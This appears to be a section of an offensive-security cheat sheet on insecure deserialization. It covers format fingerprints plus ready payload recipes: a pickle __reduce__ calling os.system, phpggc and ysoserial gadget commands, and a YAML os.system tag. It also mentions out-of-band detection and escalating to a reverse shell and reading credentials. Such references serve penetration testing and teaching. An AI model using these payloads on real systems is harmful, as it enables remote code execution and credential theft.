## Insecure Deserialization
Where: cookies/tokens/hidden fields/caches carrying serialized blobs; any endpoint that `unserialize()`/`pickle.loads()`/Java `readObject()`/`yaml.load()`/.NET `BinaryFormatter`.
Fingerprint the format: PHP `O:8:"..."` or `a:2:{...}`; Python pickle starts `\x80` (base64 `gASV`/`gAN`); Java `\xac\xed\x00\x05` (base64 `rO0AB`); .NET `AAEAAAD`; Ruby Marshal `\x04\x08`; YAML/JSON tags.
Python pickle RCE: a class with `__reduce__` returning `(os.system, ("id",))`; `pickle.dumps` it, deliver base64. Any `pickle.loads` on attacker data = instant RCE.
PHP: object injection via `__wakeup`/`__destruct` POP chains; `phpggc <framework> <gadget> system id` builds the payload (Laravel/Symfony/WordPress/Monolog chains).
Java: `ysoserial CommonsCollections1 'cmd'` (also URLDNS to just prove the sink); check for Commons-Collections/Spring/Groovy on classpath.
YAML: `yaml.load` (not safe_load) -> `!!python/object/apply:os.system ["id"]`.
Ruby: Marshal.load / universal gadget chains.
Detect blind: URLDNS/OOB gadget (Java), `!!python/object/apply:...urllib` OOB, time-delay gadget.
Escalate: deserialization is RCE — reverse shell, read flag/creds.
